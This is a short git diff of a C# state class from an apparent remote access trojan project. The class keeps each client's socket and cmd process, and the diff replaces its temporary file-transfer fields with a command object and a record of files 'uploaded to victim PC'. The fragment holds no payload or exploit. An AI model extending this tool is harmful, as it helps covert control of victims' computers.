@@ -1,4 +1,4 @@
-﻿using RAT.src.Models.Enums;
+﻿using RAT.src.Interfaces;
 using System.Diagnostics;
 using System.Net.Sockets;
 using System.Text;
@@ -35,30 +35,28 @@ namespace RAT.src.Models
         /// </summary>
         public Process ClientCmdProcess { get; set; }
 
-        ///------------------- CAN GO TO MODEL CLASS FOR FILE DOWNLOAD
-        public Socket ClientFileUploadSocket { get; set; } // ----- TEMP
+        /// <summary>
+        /// Represents command that is in process of execution.
+        /// </summary>
+        public IRatCommand CurrentRatCommand { get; set; }
 
-        public CurrentOperation CurrentOperation { get; set; } // ----- TEMP
-
-        public byte[] FileDataArray { get; set; }
-
-        public StringBuilder FileDataBuilder { get; set; } = new StringBuilder(); // ----- TEMP
-
-        public string PathForFileUpload { get; set; } // ----- TEMP
-        ///------------------- CAN GO TO MODEL CLASS FOR FILE DOWNLOAD
+        /// <summary>
+        /// Information about file that is going to be uploaded to victim PC.
+        /// </summary>
+        public FileUploadInformation FileUploadInformation { get; set; }
 
         /// <summary>
         /// Resets client connection state and kills cmd process.
         /// </summary>
         public void ResetState()
         {
+            // Disconnections from sockets should be made on upper level! Not here.
             CommandDataArray = new byte[1024];
-            FileDataArray = new byte[0];
             DataBuilder = new StringBuilder();
-            FileDataBuilder = new StringBuilder();
-            CurrentOperation = CurrentOperation.None;
-            PathForFileUpload = string.Empty;
             ClientCmdProcess.Kill();
+            CurrentRatCommand.Abort();
+            FileUploadInformation = new FileUploadInformation();
+            ClientFileDownloadSocket = null;
         }
     }
 }
